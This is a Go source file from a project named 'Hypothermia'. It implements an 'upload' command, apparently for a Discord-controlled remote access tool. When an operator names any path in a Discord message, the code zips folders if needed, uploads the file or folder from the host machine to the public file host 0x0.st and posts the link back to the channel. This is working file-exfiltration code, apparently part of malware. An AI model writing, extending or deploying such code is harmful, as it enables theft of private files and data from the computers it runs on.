package commands

import (
	"fmt"
	"os"

	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	uploadUsage string = "[path]"

	uploadArgsError     string = "🟥 Expected 1 argument."
	uploadFileInfoError string = "🟥 Failed to get info about the path."
	uploadZipError      string = "🟥 Failed to zip folder."
	uploadOpenFileError string = "🟥 Failed to open file."

	uploadSuccess string = "🟩 Uploaded at: "
)

func (*UploadCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
	if len(args) == 0 {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadArgsError+"\nUsage: "+uploadUsage, m.Reference())
		return err
	}

	path := args[0]
	info, err := os.Stat(path)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadFileInfoError, m.Reference())
		return err
	}

	var filePath string
	if info.IsDir() {
		filePath, err = utils.ZipFolder(path)
		if err != nil {
			_, err := s.ChannelMessageSendReply(m.ChannelID, uploadZipError, m.Reference())
			return err
		}
	} else {
		filePath = path
	}

	file, err := os.Open(filePath)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadOpenFileError, m.Reference())
		return err
	}

	defer file.Close()

	url, err := utils.UploadFile(filePath, file)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(err), m.Reference())
		return err
	}

	_, err = s.ChannelMessageSendReply(m.ChannelID, uploadSuccess+url, m.Reference())
	return err
}

func (*UploadCommand) Name() string {
	return "upload"
}

func (*UploadCommand) Info() string {
	return "uploads a chosen file or folder to 0x0.st"
}

type UploadCommand struct{}
